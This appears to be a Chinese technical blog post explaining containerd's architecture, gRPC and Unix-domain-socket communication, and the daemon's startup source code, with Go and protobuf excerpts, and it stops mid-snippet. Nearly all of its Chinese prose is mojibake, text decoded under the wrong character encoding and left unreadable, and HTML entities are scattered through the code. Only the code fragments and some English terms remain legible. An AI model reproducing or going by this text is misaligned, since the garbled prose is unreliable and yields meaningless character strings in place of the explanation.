Containerdã€‚ Containerd æä¾›å•ä¸ªèŠ‚ç‚¹çš„å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼ŒåŒ…æ‹¬é•œåƒã€å­˜å‚¨ã€rootfsã€ç½‘ç»œï¼Œå¯åŠ¨å®¹å™¨æ˜¯ Containerd é€šè¿‡ OCI-runtime æ ‡å‡†è°ƒç”¨ runcã€‚ Runc å®¹å™¨å¼•å¯¼å™¨ï¼Œè´Ÿè´£æ ¹æ®ä¸€ä¸ªå®¹å™¨çš„å…·ä½“é…ç½®ï¼Œåœ¨æŒ‡å®š rootfs ä¸Šå¼•å¯¼å¯åŠ¨ä¸€ä¸ªå®¹å™¨è¿›ç¨‹ã€‚ gRPCæ¡†æ¶åŸç† gRPCï¼ˆGoogle Remote Procedure Callï¼‰æ˜¯ä¸€ä¸ªç°ä»£åŒ–ã€é«˜æ€§èƒ½çš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰æ¡†æ¶ï¼Œè®¾è®¡ç”¨äºåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å®ç°è·¨ç½‘ç»œã€è·¨è¯­è¨€çš„æœåŠ¡è°ƒç”¨ã€‚å®ƒåˆ©ç”¨äº† HTTP/2 å’Œ Protocol Buffersï¼Œä¸ºå¼€å‘è€…æä¾›äº†ä¸€ç§ç®€ä¾¿çš„æ–¹å¼æ¥è°ƒç”¨è¿œç¨‹æœåŠ¡ï¼Œå°±åƒè°ƒç”¨æœ¬åœ°å‡½æ•°ä¸€æ ·ã€‚ä¸‹é¢æ˜¯ gRPC çš„åŸºæœ¬åŸç†åŠå…¶å…³é”®ç»„ä»¶ã€‚\ngRPC çš„å·¥ä½œæµç¨‹ æœåŠ¡å®šä¹‰ä¸æ¥å£ç”Ÿæˆ Protocol Buffers å®šä¹‰æœåŠ¡: containerd ä½¿ç”¨ Protocol Buffersï¼ˆprotobufï¼‰æ¥å®šä¹‰ gRPC æœåŠ¡ã€‚è¿™äº›æœåŠ¡æ¥å£å’Œæ¶ˆæ¯ç»“æ„é€šå¸¸å®šä¹‰åœ¨ .proto æ–‡ä»¶ä¸­ã€‚ä¾‹å¦‚ï¼Œcontainers.proto æ–‡ä»¶å®šä¹‰äº†å®¹å™¨ç®¡ç†çš„æœåŠ¡æ¥å£ã€‚\nprotobufCopy codesyntax = \u0026#34;proto3\u0026#34;; service Containers { rpc Create (CreateContainerRequest) returns (CreateContainerResponse); rpc Start (StartContainerRequest) returns (StartContainerResponse); rpc Stop (StopContainerRequest) returns (StopContainerResponse); } message CreateContainerRequest { string id = 1; // å…¶ä»–å­—æ®µ... } message CreateContainerResponse { // å“åº”å­—æ®µ... } ç”Ÿæˆå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä»£ç : ä½¿ç”¨ protoc ç¼–è¯‘å™¨ï¼Œ.proto æ–‡ä»¶ä¼šç”Ÿæˆç›¸åº”çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä»£ç ã€‚å¯¹äº containerdï¼Œè¿™äº›ç”Ÿæˆçš„ä»£ç æ˜¯ä¸ containerd æ ¸å¿ƒåŠŸèƒ½é›†æˆåœ¨ä¸€èµ·çš„ï¼Œå®¢æˆ·ç«¯ä»£ç é€šå¸¸ç”±å¤–éƒ¨å·¥å…·æˆ–æœåŠ¡ä½¿ç”¨ã€‚\ngRPC æœåŠ¡çš„å®ç° æœåŠ¡å®ç°: containerd ä¸­æ¯ä¸ª gRPC æœåŠ¡éƒ½æœ‰ä¸€ä¸ªå…·ä½“çš„å®ç°ï¼Œè¿™äº›å®ç°è´Ÿè´£å¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚å¹¶æ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚æœåŠ¡çš„å®ç°é€šå¸¸ä½äº containerd çš„ services ç›®å½•ä¸­ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ã€‚\ntype containersServer struct { // ç›¸å…³å­—æ®µå’Œä¾èµ–æ³¨å…¥ } func (s *containersServer) Create(ctx context.Context, req *CreateContainerRequest) (*CreateContainerResponse, error) { // å®ç°å®¹å™¨åˆ›å»ºé€»è¾‘ } func (s *containersServer) Start(ctx context.Context, req *StartContainerRequest) (*StartContainerResponse, error) { // å®ç°å®¹å™¨å¯åŠ¨é€»è¾‘ } // å…¶ä»–æœåŠ¡æ–¹æ³•... æœåŠ¡æ³¨å†Œ: åœ¨ containerd å¯åŠ¨æ—¶ï¼ŒgRPC æœåŠ¡å™¨ä¼šå¯åŠ¨å¹¶ç›‘å¬ä¸€ä¸ª Unix Domain Socket (UDS) åœ°å€æˆ– TCP ç«¯å£ï¼Œç„¶åå°†æ‰€æœ‰çš„æœåŠ¡æ³¨å†Œåˆ° gRPC æœåŠ¡å™¨ä¸­ã€‚\ngrpcServer := grpc.NewServer() containerspb.RegisterContainersServer(grpcServer, \u0026amp;containersService) // æ³¨å†Œå…¶ä»–æœåŠ¡... gRPC é€šä¿¡æœºåˆ¶ è¯·æ±‚çš„å‘é€ä¸æ¥æ”¶: å®¢æˆ·ç«¯é€šè¿‡ç”Ÿæˆçš„ gRPC å®¢æˆ·ç«¯ä»£ç å‘ containerd å‘é€è¯·æ±‚ã€‚è¯·æ±‚é€šè¿‡ gRPC æ¡†æ¶åœ¨å®¢æˆ·ç«¯è¿›è¡Œåºåˆ—åŒ–ï¼ˆä½¿ç”¨ Protocol Buffersï¼‰ï¼Œç„¶åé€šè¿‡åº•å±‚ä¼ è¾“åè®®ï¼ˆé€šå¸¸æ˜¯ HTTP/2 over Unix Domain Socketsï¼‰å‘é€åˆ° containerdã€‚ æœåŠ¡å™¨ç«¯å¤„ç†: containerd çš„ gRPC æœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå°†å…¶ååºåˆ—åŒ–ä¸ºç›¸åº”çš„æ¶ˆæ¯å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å¯¹åº”æœåŠ¡çš„å®ç°æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚å¤„ç†å®Œæˆåï¼Œå“åº”ç»“æœå†é€šè¿‡ gRPC è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ è¿æ¥ç®¡ç†: gRPC æ”¯æŒé•¿è¿æ¥ï¼Œå¤šä¸ªè¯·æ±‚å¯ä»¥åœ¨åŒä¸€ä¸ªè¿æ¥ä¸­å¹¶å‘è¿›è¡Œã€‚å¯¹äºæœ¬åœ°é€šä¿¡ï¼Œcontainerd é€šå¸¸ä½¿ç”¨ Unix Domain Sockets (UDS) ä½œä¸ºä¼ è¾“å±‚ï¼Œæå‡é€šä¿¡æ•ˆç‡å¹¶å¢å¼ºå®‰å…¨æ€§ã€‚ å…³é”®åº”ç”¨åœºæ™¯ å®¢æˆ·ç«¯ä¸ containerd çš„é€šä¿¡: å¤–éƒ¨å®¢æˆ·ç«¯ï¼ˆå¦‚ ctr å·¥å…·æˆ– Docker å¼•æ“ï¼‰é€šè¿‡ gRPC ä¸ containerd è¿›è¡Œé€šä¿¡ï¼Œæ‰§è¡Œå®¹å™¨çš„åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢ã€åˆ é™¤ç­‰æ“ä½œã€‚ containerd æ’ä»¶çš„é›†æˆ: æ’ä»¶é€šè¿‡ gRPC æä¾›æœåŠ¡æ¥å£ï¼Œcontainerd æ ¸å¿ƒé€šè¿‡è°ƒç”¨è¿™äº›æ¥å£æ¥ç®¡ç†é•œåƒã€å¿«ç…§å’Œå®¹å™¨è¿è¡Œæ—¶ç­‰ã€‚ containerd-shim ä¸ containerd çš„é€šä¿¡: containerd-shim è¿›ç¨‹è´Ÿè´£ç®¡ç†æ¯ä¸ªå®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼Œä¸ containerd æ ¸å¿ƒé€šè¿‡ gRPC é€šä¿¡æ¥æŠ¥å‘Šå®¹å™¨çŠ¶æ€ã€æ¥æ”¶ç®¡ç†å‘½ä»¤ç­‰ã€‚ gRPCä¸­ä½¿ç”¨UDSçš„åœºæ™¯ åœ¨ containerd ä¸­ï¼ŒUnix Domain Sockets (UDS) é€šä¿¡é€šå¸¸ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š\ncontainerd å®ˆæŠ¤è¿›ç¨‹ä¸å®¢æˆ·ç«¯ä¹‹é—´çš„é€šä¿¡ åœºæ™¯: containerd å®ˆæŠ¤è¿›ç¨‹ä¸å¤–éƒ¨å®¢æˆ·ç«¯ï¼ˆå¦‚ ctr å·¥å…·æˆ– Docker å¼•æ“ï¼‰ä¹‹é—´çš„é€šä¿¡ã€‚ ä¾‹å­: å½“ Docker å¼•æ“éœ€è¦ä¸ containerd äº¤äº’æ—¶ï¼Œå®ƒé€šè¿‡ gRPC è¿æ¥åˆ° containerd çš„ UDS åœ°å€ï¼Œå¦‚ /run/containerd/containerd.sockï¼Œä»¥è¯·æ±‚ç®¡ç†å®¹å™¨ã€é•œåƒã€å¿«ç…§ç­‰æ“ä½œã€‚ è¯¦ç»†æè¿°: containerd å¯åŠ¨æ—¶ï¼Œä¼šåœ¨é…ç½®çš„åœ°å€ï¼ˆé€šå¸¸æ˜¯ /run/containerd/containerd.sockï¼‰ä¸Šåˆ›å»ºä¸€ä¸ª UDS ç›‘å¬å™¨ã€‚ Docker å¼•æ“æˆ–å…¶ä»–å®¢æˆ·ç«¯é€šè¿‡ gRPC è¿æ¥åˆ°è¿™ä¸ª UDS åœ°å€æ¥ä¸ containerd äº¤äº’ã€‚ è¿™ç§æ–¹å¼é¿å…äº†ç½‘ç»œå¼€é”€ï¼Œå¹¶é™åˆ¶äº†é€šä¿¡åªèƒ½å‘ç”Ÿåœ¨æœ¬åœ°ä¸»æœºä¸Šï¼Œæé«˜äº†å®‰å…¨æ€§ã€‚ containerd-shim ä¸ containerd å®ˆæŠ¤è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ åœºæ™¯: æ¯ä¸ªå®¹å™¨éƒ½æœ‰ä¸€ä¸ª containerd-shim è¿›ç¨‹ï¼Œcontainerd-shim è´Ÿè´£ç®¡ç†å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸï¼Œè€Œ containerd-shim ä¸ containerd å®ˆæŠ¤è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ä¹Ÿæ˜¯é€šè¿‡ UDS å®ç°çš„ã€‚ ä¾‹å­: å½“ containerd å¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨æ—¶ï¼Œå®ƒä¼šåˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªå¯¹åº”çš„ containerd-shim è¿›ç¨‹ã€‚containerd-shim é€šè¿‡ä¸€ä¸ª UDS ä¸ containerd è¿›è¡Œé€šä¿¡ï¼Œä»¥æŠ¥å‘Šå®¹å™¨çš„çŠ¶æ€å’Œæ¥å—å‘½ä»¤ã€‚ è¯¦ç»†æè¿°: containerd-shim è¿›ç¨‹ä¼šä¸ºæ¯ä¸ªå®¹å™¨åˆ›å»ºä¸€ä¸ª UDSï¼Œç”¨äºä¸ containerd äº¤äº’ã€‚ é€šè¿‡è¿™ä¸ª UDSï¼Œcontainerd å¯ä»¥å‘ containerd-shim å‘é€æŒ‡ä»¤ï¼Œå¦‚å¯åŠ¨æˆ–åœæ­¢å®¹å™¨ï¼Œå¹¶æ¥æ”¶æ¥è‡ª containerd-shim çš„çŠ¶æ€æ›´æ–°ã€‚ containerd æ’ä»¶ä¸å¤–éƒ¨æœåŠ¡çš„é€šä¿¡ åœºæ™¯: æŸäº›æ’ä»¶å¯èƒ½ä½œä¸ºå¤–éƒ¨æœåŠ¡è¿è¡Œï¼Œéœ€è¦é€šè¿‡ UDS ä¸ containerd é€šä¿¡ã€‚ ä¾‹å­: ä¸€äº›å¤–éƒ¨å­˜å‚¨æ’ä»¶å¯èƒ½ç‹¬ç«‹è¿è¡Œå¹¶é€šè¿‡ UDS æš´éœ²å…¶ gRPC æœåŠ¡ï¼Œcontainerd é€šè¿‡è¿æ¥è¿™ä¸ª UDS æ¥è°ƒç”¨æ’ä»¶çš„æœåŠ¡ã€‚ è¯¦ç»†æè¿°: æ’ä»¶å¯ä»¥åœ¨ä¸åŒçš„è¿›ç¨‹ä¸­è¿è¡Œï¼Œé€šè¿‡ UDS æš´éœ²å…¶æœåŠ¡æ¥å£ã€‚ containerd è¿æ¥åˆ°è¿™äº› UDS åœ°å€æ¥ä¸æ’ä»¶äº¤äº’ï¼Œæ‰§è¡Œè¯¸å¦‚å­˜å‚¨ç®¡ç†æˆ–ç½‘ç»œç®¡ç†ç­‰æ“ä½œã€‚ å®ˆæŠ¤è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ åœºæ™¯: å¦‚æœéœ€è¦åœ¨å¤šä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼ˆä¾‹å¦‚ containerd å’Œå…¶ä»–ä¾èµ–æœåŠ¡ï¼‰ä¹‹é—´å»ºç«‹å®‰å…¨ä¸”é«˜æ•ˆçš„æœ¬åœ°é€šä¿¡ï¼Œå¯ä»¥ä½¿ç”¨ UDSã€‚ ä¾‹å­: åœ¨ä¸€äº›å¤æ‚çš„é›†ç¾¤ç¯å¢ƒä¸­ï¼Œcontainerd å¯èƒ½éœ€è¦ä¸å…¶ä»–å®ˆæŠ¤è¿›ç¨‹ï¼ˆå¦‚ CRI-Oã€etcd ç­‰ï¼‰è¿›è¡Œæœ¬åœ°é€šä¿¡ï¼Œè¿™ç§æƒ…å†µä¸‹ä¹Ÿå¯èƒ½ä½¿ç”¨ UDSã€‚ è¯¦ç»†æè¿°: å¤šä¸ªå®ˆæŠ¤è¿›ç¨‹åœ¨åŒä¸€å°ä¸»æœºä¸Šè¿è¡Œæ—¶ï¼Œé€šè¿‡ UDS é€šä¿¡ï¼Œé¿å…äº†ä½¿ç”¨ TCP/IP å¸¦æ¥çš„ç½‘ç»œå¼€é”€å’Œå®‰å…¨é£é™©ã€‚ containerdæºç åˆ†æ containerdå¯åŠ¨æµç¨‹ æ–‡ä»¶è·¯å¾„ï¼šcontainerd/cmd/containerd/main.goï¼Œæ•´ä¸ªç¨‹åºä»è¿™é‡Œå¼€å§‹å¯åŠ¨ï¼Œè°ƒç”¨command.App()å‡½æ•°ã€‚\npackage main import ( \u0026#34;crypto\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;github.com/containerd/containerd/v2/cmd/containerd/command\u0026#34; \u0026#34;github.com/containerd/containerd/v2/internal/hasher\u0026#34; _ \u0026#34;github.com/containerd/containerd/v2/cmd/containerd/builtins\u0026#34; ) func init() { crypto.RegisterHash(crypto.SHA256, hasher.NewSHA256) } func main() { app := command.App() if err := app.Run(os.Args); err != nil { fmt.Fprintf(os.Stderr, \u0026#34;containerd: %s\\n\u0026#34;, err) os.Exit(1) } } æ–‡ä»¶è·¯å¾„ï¼šcontainerd/cmd/containerd/command/main.goï¼Œè¯¥æ–‡ä»¶ä¸»è¦ç”¨äºå®ç° containerd å®ˆæŠ¤è¿›ç¨‹çš„å¯åŠ¨å’Œç®¡ç†é€»è¾‘ã€‚è¯¥ä»£ç åŒ…æ‹¬äº†å¦‚ä½•åˆå§‹åŒ– containerd å®ˆæŠ¤è¿›ç¨‹ã€è§£æå‘½ä»¤è¡Œå‚æ•°ã€è®¾ç½®é…ç½®é¡¹ï¼Œä»¥åŠå¤„ç†ä¿¡å·å’ŒæœåŠ¡ç»ˆæ­¢ã€‚\n// App returns a *cli.App instance. func App() *cli.App { app := cli.NewApp() app.Name = \u0026#34;containerd\u0026#34; app.Version = version.Version app.Usage = usage app.Flags = append(app.Flags, serviceFlags()...) app.Commands = []*cli.Command{ configCommand, publishCommand, ociHook, } app.Action = func(cliContext *cli.Context) error { var ( start = time.Now() signals = make(chan os.Signal, 2048) serverC = make(chan *server.Server, 1) ctx, cancel = context.WithCancel(cliContext.Context) config = defaultConfig() ) //Â·Â·Â·æ­¤å¤„çœç•¥éƒ¨åˆ†ä»£ç  if config.Debug.Address != \u0026#34;\u0026#34; { var l net.Listener if isLocalAddress(config.Debug.Address) { if l, err = sys.GetLocalListener(config.Debug.Address, config.Debug.UID, config.Debug.GID); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, err) } } else { if l, err = net.Listen(\u0026#34;tcp\u0026#34;, config.Debug.Address); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, err) } } serve(ctx, l, server.ServeDebug) } if config.Metrics.Address != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.Metrics.Address) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for metrics endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeMetrics) } // setup the ttrpc endpoint tl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main ttrpc endpoint: %w\u0026#34;, err) } serve(ctx, tl, server.ServeTTRPC) if config.GRPC.TCPAddress != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.GRPC.TCPAddress) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for TCP grpc endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeTCP) } // setup the main grpc endpoint l, err := sys.GetLocalListener(config.GRPC.Address, config.GRPC.UID, config.GRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeGRPC) readyC := make(chan struct{}) go func() { server.Wait() close(readyC) }() return nil } return app } func serve(ctx context.Context, l net.Listener, serveFunc func(net.Listener) error) { path := l.Addr().String() log.G(ctx).WithField(\u0026#34;address\u0026#34;, path).Info(\u0026#34;serving...\u0026#34;) go func() { defer l.Close() if err := serveFunc(l); err != nil { log.G(ctx).WithError(err).WithField(\u0026#34;address\u0026#34;, path).Fatal(\u0026#34;serve failure\u0026#34;) } }() } //Â·Â·Â·æ­¤å¤„çœç•¥éƒ¨åˆ†ä»£ç  è¯¦ç»†åˆ†æï¼ˆæˆ‘åªæŒ‘äº›é‡ç‚¹çš„åˆ†æï¼‰ï¼š\nä¸»é€»è¾‘ (app.Action)\napp.Action ä¸­çš„ä¸»é€»è¾‘æ˜¯ containerd å®ˆæŠ¤è¿›ç¨‹å¯åŠ¨çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚å®ƒåŒ…æ‹¬åˆå§‹åŒ–ä¸Šä¸‹æ–‡ã€åŠ è½½å’Œåº”ç”¨é…ç½®ã€å¯åŠ¨ gRPC å’Œ TTRPC æœåŠ¡ã€ä¿¡å·å¤„ç†ï¼Œä»¥åŠæœ€ç»ˆçš„æœåŠ¡å¯åŠ¨å’Œç®¡ç†ã€‚ä»¥ä¸‹æ˜¯å¯¹ä¸»é€»è¾‘çš„è¯¦ç»†åˆ†æï¼š\nåˆå§‹åŒ–\nvar ( start = time.Now() signals = make(chan os.Signal, 2048) serverC = make(chan *server.Server, 1) ctx, cancel = context.WithCancel(cliContext.Context) config = defaultConfig() ) defer cancel() æ—¶é—´è®°å½• (start): è®°å½•å®ˆæŠ¤è¿›ç¨‹å¯åŠ¨çš„æ—¶é—´ï¼Œç”¨äºåç»­æ—¥å¿—è®°å½•å¯åŠ¨è€—æ—¶ã€‚\nä¿¡å·é€šé“ (signals): åˆ›å»ºä¸€ä¸ªç¼“å†²åŒºä¸º 2048 çš„é€šé“ï¼Œç”¨äºæ¥æ”¶ç³»ç»Ÿä¿¡å·ï¼Œå¦‚ SIGTERM æˆ– SIGHUPï¼Œä»¥ä¾¿è¿›è¡Œä¼˜é›…çš„å…³é—­æ“ä½œã€‚\næœåŠ¡å™¨é€šé“ (serverC): ç”¨äºåœ¨å¼‚æ­¥åˆå§‹åŒ–å®Œæˆåä¼ é€’ containerd æœåŠ¡å™¨å®ä¾‹ã€‚\nä¸Šä¸‹æ–‡ (ctx, cancel): ä½¿ç”¨ context.WithCancel åˆ›å»ºä¸€ä¸ªå¯å–æ¶ˆçš„ä¸Šä¸‹æ–‡ï¼Œç¡®ä¿åœ¨éœ€è¦æ—¶èƒ½å¤Ÿå–æ¶ˆæ‰€æœ‰ä¸ä¸Šä¸‹æ–‡å…³è”çš„æ“ä½œã€‚\né…ç½® (config): è°ƒç”¨ defaultConfig() å‡½æ•°åˆ›å»ºä¸€ä¸ªé»˜è®¤é…ç½®å¯¹è±¡ï¼Œç”¨äºå­˜å‚¨åŠ è½½çš„é…ç½®é€‰é¡¹ã€‚\nåŠ è½½å’Œåº”ç”¨é…ç½®\nconfigPath := cliContext.String(\u0026#34;config\u0026#34;) _, err := os.Stat(configPath) if !os.IsNotExist(err) || cliContext.IsSet(\u0026#34;config\u0026#34;) { if err := srvconfig.LoadConfig(ctx, configPath, config); err != nil { return err } } é…ç½®æ–‡ä»¶è·¯å¾„: ä»å‘½ä»¤è¡Œå‚æ•°ä¸­è·å–é…ç½®æ–‡ä»¶è·¯å¾„ï¼ˆconfigPathï¼‰ï¼Œé»˜è®¤æƒ…å†µä¸‹æŒ‡å‘ /etc/containerd/config.toml æˆ–å…¶ä»–é»˜è®¤è·¯å¾„ã€‚\næ£€æŸ¥é…ç½®æ–‡ä»¶å­˜åœ¨æ€§: ä½¿ç”¨ os.Stat æ£€æŸ¥é…ç½®æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œæˆ–è€…ç”¨æˆ·æ˜¯å¦æ˜ç¡®æŒ‡å®šäº†é…ç½®æ–‡ä»¶è·¯å¾„ã€‚å¦‚æœå­˜åœ¨æˆ–æŒ‡å®šäº†è·¯å¾„ï¼Œè°ƒç”¨ srvconfig.LoadConfig åŠ è½½é…ç½®æ–‡ä»¶åˆ° config å¯¹è±¡ä¸­ã€‚\né”™è¯¯å¤„ç†: å¦‚æœåŠ è½½é…ç½®å¤±è´¥ï¼Œç«‹å³è¿”å›é”™è¯¯å¹¶ç»ˆæ­¢å¯åŠ¨æµç¨‹ã€‚\nç¡®ä¿å¿…è¦é…ç½®å­˜åœ¨\nif config.GRPC.Address == \u0026#34;\u0026#34; { return fmt.Errorf(\u0026#34;grpc address cannot be empty: %w\u0026#34;, errdefs.ErrInvalidArgument) } if config.TTRPC.Address == \u0026#34;\u0026#34; { config.TTRPC.Address = config.GRPC.Address + \u0026#34;.ttrpc\u0026#34; config.TTRPC.UID = config.GRPC.UID config.TTRPC.GID = config.GRPC.GID } éªŒè¯ gRPC åœ°å€: ç¡®ä¿ gRPC æœåŠ¡çš„åœ°å€å·²åœ¨é…ç½®ä¸­è®¾ç½®ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œåˆ™è¿”å›é”™è¯¯ï¼Œå› ä¸º gRPC åœ°å€æ˜¯ containerd æœåŠ¡çš„å…³é”®é…ç½®ã€‚ è®¾ç½® TTRPC åœ°å€: å¦‚æœ TTRPC åœ°å€æœªé…ç½®ï¼Œåˆ™ä½¿ç”¨ gRPC åœ°å€é™„åŠ  .ttrpc ä½œä¸ºé»˜è®¤åœ°å€ï¼Œå¹¶å¤åˆ¶ gRPC çš„ç”¨æˆ· ID å’Œç»„ ID è®¾ç½®ã€‚ å¤„ç†æœåŠ¡æ³¨å†Œå’Œä¿¡å·\nstop, err := registerUnregisterService(config.Root) if err != nil { log.L.Fatal(err) } if stop { return nil } done := handleSignals(ctx, signals, serverC, cancel) signal.Notify(signals, handledSignals...) æœåŠ¡æ³¨å†Œ/æ³¨é”€: è°ƒç”¨ registerUnregisterService å‡½æ•°ï¼Œå¤„ç† Windows æœåŠ¡çš„æ³¨å†Œæˆ–æ³¨é”€ã€‚å¦‚æœå¤„ç†å®Œæ¯•åˆ™ç»ˆæ­¢ç¨‹åºï¼ˆç”¨äºåœ¨ Windows ä¸Šæ“ä½œæœåŠ¡æ§åˆ¶ç®¡ç†å™¨ï¼‰ã€‚ ä¿¡å·å¤„ç†: è°ƒç”¨ handleSignals å‡½æ•°ï¼Œè®¾ç½®ä¿¡å·å¤„ç†å™¨ doneï¼Œç”¨äºå¤„ç†æ¥è‡ªç³»ç»Ÿçš„ä¿¡å·ï¼ˆå¦‚ SIGTERMã€SIGINTï¼‰ã€‚ç„¶åè°ƒç”¨ signal.Notifyï¼Œå°†æŒ‡å®šçš„ä¿¡å·æ³¨å†Œåˆ° signals é€šé“ä¸­ï¼Œä»¥ä¾¿åœ¨æ¥æ”¶åˆ°ä¿¡å·æ—¶è§¦å‘ç›¸åº”çš„æ“ä½œã€‚ å¯åŠ¨ containerd æœåŠ¡å™¨\ntype srvResp struct { s *server.Server err error } chsrv := make(chan srvResp) go func() { defer close(chsrv) server, err := server.New(ctx, config) if err != nil { select { case chsrv \u0026lt;- srvResp{err: err}: case \u0026lt;-ctx.Done(): } return } if err := launchService(server, done); err != nil { log.L.Fatal(err) } select { case \u0026lt;-ctx.Done(): server.Stop() case chsrv \u0026lt;- srvResp{s: server}: } }() å¼‚æ­¥åˆå§‹åŒ–æœåŠ¡å™¨: ä½¿ç”¨ goroutine å¼‚æ­¥åˆå§‹åŒ– containerd æœåŠ¡å™¨ï¼Œé¿å…åœ¨ä¸»çº¿ç¨‹ä¸­é˜»å¡ï¼Œä¾‹å¦‚åœ¨ Bolt æ•°æ®åº“åˆå§‹åŒ–è¿‡ç¨‹ä¸­ã€‚ åˆ›å»º containerd æœåŠ¡å™¨: è°ƒç”¨ server.New ä½¿ç”¨é…ç½®åˆå§‹åŒ– containerd æœåŠ¡å™¨å®ä¾‹ã€‚å¦‚æœå‡ºç°é”™è¯¯ï¼Œé€šè¿‡ chsrv é€šé“è¿”å›é”™è¯¯å¹¶é€€å‡ºã€‚ å¯åŠ¨æœåŠ¡: å¦‚æœéœ€è¦ï¼Œè°ƒç”¨ launchService å¯åŠ¨ containerd æœåŠ¡å™¨ä½œä¸º Windows æœåŠ¡ï¼ˆä»…åœ¨ Windows å¹³å°ä¸Šï¼‰ã€‚ åœæ­¢æœåŠ¡å™¨: ç›‘å¬ ctx.Done() ä¿¡å·ï¼Œå½“ä¸Šä¸‹æ–‡è¢«å–æ¶ˆæ—¶ï¼Œè°ƒç”¨ server.Stop åœæ­¢æœåŠ¡å™¨ã€‚ è¿›ä¸€æ­¥åˆ†æserver.New()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åœ¨containerd/cmd/containerd/server/server.goä¸­ã€‚\nè¿™ä¸ªå‡½æ•°ç”¨äºåˆ›å»ºå’Œåˆå§‹åŒ– gRPC æœåŠ¡å™¨çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚å®ƒæ¶‰åŠé…ç½®çš„è¿ç§»ã€æ’ä»¶çš„åŠ è½½ä¸åˆå§‹åŒ–ã€gRPC æœåŠ¡çš„æ³¨å†Œï¼Œä»¥åŠå…¶ä»–æœåŠ¡å™¨è®¾ç½®ã€‚ï¼ˆæˆ‘è¿™é‡Œåªåˆ†æäº†éƒ¨åˆ†é‡è¦æºç ï¼‰\n(1)é…ç½®è¿ç§»\nif currentVersion \u0026lt; version.ConfigVersion { // Migrate config to latest version t1 := time.Now() err := config.MigrateConfig(ctx) if err != nil { return nil, err } migrationT = time.Since(t1) } ç‰ˆæœ¬æ£€æŸ¥ä¸è¿ç§»ï¼šå¦‚æœå½“å‰é…ç½®çš„ç‰ˆæœ¬ä½äºç³»ç»Ÿè¦æ±‚çš„ç‰ˆæœ¬ï¼Œåˆ™è¿›è¡Œé…ç½®è¿ç§»ã€‚è¿ç§»æ—¶é—´è¢«è®°å½•åœ¨ migrationT ä¸­ã€‚\né…ç½®è¿ç§»ï¼šé€šè¿‡ config.MigrateConfig(ctx) æ–¹æ³•è¿›è¡Œè¿ç§»ï¼Œå°†é…ç½®æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚\n(2)é…ç½® Stream å¤„ç†å™¨\nfor id, p := range config.StreamProcessors { diff.RegisterProcessor(diff.BinaryHandler(id, p.Returns, p.Accepts, p.Path, p.Args, p.Env)) } æ³¨å†Œæµå¤„ç†å™¨ï¼šæ ¹æ®é…ç½®ä¸­çš„ StreamProcessors æ³¨å†Œæµå¤„ç†å™¨ï¼Œè¿™äº›å¤„ç†å™¨ç”¨äºå¤„ç†æ•°æ®æµã€‚ (3)ã€åˆå§‹åŒ– gRPC æœåŠ¡å™¨\nserverOpts := []grpc.ServerOption{ grpc.StatsHandler(otelgrpc.NewServerHandler()), grpc.ChainStreamInterceptor( streamNamespaceInterceptor, prometheusServerMetrics.StreamServerInterceptor(), ), grpc.ChainUnaryInterceptor( unaryNamespaceInterceptor, prometheusServerMetrics.UnaryServerInterceptor(), ), } gRPC æœåŠ¡å™¨é€‰é¡¹ï¼šé…ç½® gRPC æœåŠ¡å™¨çš„é€‰é¡¹ï¼Œå¦‚ç»Ÿè®¡å¤„ç†ç¨‹åºã€æ‹¦æˆªå™¨ç­‰ã€‚è¿™äº›æ‹¦æˆªå™¨å¯ä»¥ç”¨äºå¤„ç†å‘½åç©ºé—´ã€ç›‘æ§ç­‰ã€‚ (4)ã€æ³¨å†ŒæœåŠ¡\nfor _, service := range grpcServices { if err := service.Register(grpcServer); err != nil { return nil, err } } å¯åŠ¨ gRPC å’Œå…¶ä»–æœåŠ¡ï¼ˆé‡ç‚¹ï¼‰\nif config.Debug.Address != \u0026#34;\u0026#34; { var l net.Listener if isLocalAddress(config.Debug.Address) { if l, err = sys.GetLocalListener(config.Debug.Address, config.Debug.UID, config.Debug.GID); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, 